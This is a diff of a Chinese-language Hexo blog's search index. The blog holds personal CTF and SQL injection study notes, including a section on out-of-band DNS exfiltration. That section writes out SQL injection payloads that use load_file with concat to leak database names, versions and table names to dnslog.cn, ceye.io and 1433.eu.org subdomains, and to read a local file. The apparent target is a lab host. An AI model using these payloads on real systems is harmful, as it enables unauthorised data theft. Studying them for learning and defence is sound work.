@@ -64,6 +64,9 @@
 
 <p>总结反思，看了网上的解题思路，他们在 SHOW DATABASES后再次 SHOW TABLE，是更快的解题思路，这次没有注意，已经总结，还有小细节需要再次总结</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title>Hexo网站搭建和命令</title>
@@ -224,7 +227,7 @@
     <title>SQL注入技巧和要点</title>
     <url>/2024/03/21/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%92%8C%E8%A6%81%E7%82%B9/</url>
     <content><![CDATA[<p>SQL注入大致流程：<br>1.考虑闭合问题，闭合前面的单引号，闭合后面的–+<br>2.考虑过滤问题，是否有“;”，SHWO，SELETE和“.”等过滤<br>3.考虑数据库，是否可以同时执行多条SQL语句（16进制需要在完整SQL语句下执行）<br>4.</p>
-<p>SQL注入要点和细节：<br>1.纯数字的表名需要反引号来圈起来</p>
+<p>SQL注入要点和细节：<br>1.纯数字的表名需要反引号来圈起来<br>2.</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先查看当前</span></span><br><span class="line">SHOW TABLES; <span class="comment"># 查看当前数据库下的所有表</span></span><br><span class="line">SELECT column_name FROM table_name; <span class="comment"># 从当前数据库的指定表中查询指定列的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再查看指定</span></span><br><span class="line">SHOW DATABASES; <span class="comment"># 查看所有数据库</span></span><br><span class="line">SHOW TABLES FROM database_name; <span class="comment"># 查看指定数据库下所有的表</span></span><br><span class="line">SHOW COLUMNS FROM database_name.table_name; <span class="comment"># 查看指定数据库中指定表下所有的列，适用于 SQL 注入时检查是否有“.”过滤</span></span><br><span class="line">SHOW COLUMNS FROM table_name IN database_name; <span class="comment"># 查看指定数据库中指定表下所有的列，适用于 SQL 注入时检查是否有“.”过滤</span></span><br><span class="line"></span><br><span class="line">SELECT column_name FROM database_name.table_name; <span class="comment"># 从特定数据库的特定表中查询指定列的数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
@@ -896,13 +899,8 @@
 <li><p>带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等<br>SQL注入：</p>
 </li>
 </ol>
-<p>select load_file(concat(‘\\‘,(select database()),’.7logee.dnslog.cn\aa’));</p>
-<p>union select 1,2,3,load_file(“d:\1.txt”),5,6</p>
-<p>查询当前数据库<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and (select load_file(concat(‘&#x2F;&#x2F;‘,(select database()),’.d7a64120ce.ipv6.1433.eu.org&#x2F;abc’)))</p>
-<p>查询当前版本<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and (select load_file(concat(‘&#x2F;&#x2F;‘,(select version()),’.ac45c0ae7c.ipv6.1433.eu.org&#x2F;abc’)))</p>
-<p>查询其他数据库<br>id&#x3D;1 and load_file(concat(“\\“,(select schema_name from information_schema.schemata limit 0,1),”.dbuh8a.ceye.io\xxx.txt”))</p>
-<p>查询当前数据库demo01中第一个表名<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and load_file(concat(“\\“,(select table_name from information_schema.tables where table_schema&#x3D;’demo01’ limit 0,1 ),”.ac45c0ae7c.ipv6.1433.eu.org\xxx.txt”))</p>
-<p>查询当前数据库demo01中第二个表名<br>10.0.1.139&#x2F;sqli&#x2F;new.php?id&#x3D;1 and load_file(concat(“\\“,(select table_name from information_schema.tables where table_schema&#x3D;’demo01’ limit 1,1 ),”.ac45c0ae7c.ipv6.1433.eu.org\xxx.txt”))</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.7logee.dnslog.cn\\aa&#x27;</span>));</span><br><span class="line"></span><br><span class="line">union <span class="keyword">select</span> 1,2,3,load_file(<span class="string">&quot;d:\\1.txt&quot;</span>),5,6</span><br><span class="line"></span><br><span class="line">查询当前数据库</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.d7a64120ce.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询当前版本</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> version()),<span class="string">&#x27;.ac45c0ae7c.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询其他数据库</span><br><span class="line"><span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> schema_name from information_schema.schemata <span class="built_in">limit</span> 0,1),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line">查询当前数据库demo01中第一个表名</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 0,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line">查询当前数据库demo01中第二个表名</span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 1,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br></pre></td></tr></table></figure>
+
 <p>由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<br>limit 0,1 查询第一个数据库名<br>limit 1,1 查询第二个数据库名<br>limit 2,1 查询第三个数据库名</p>
 ]]></content>
       <categories>
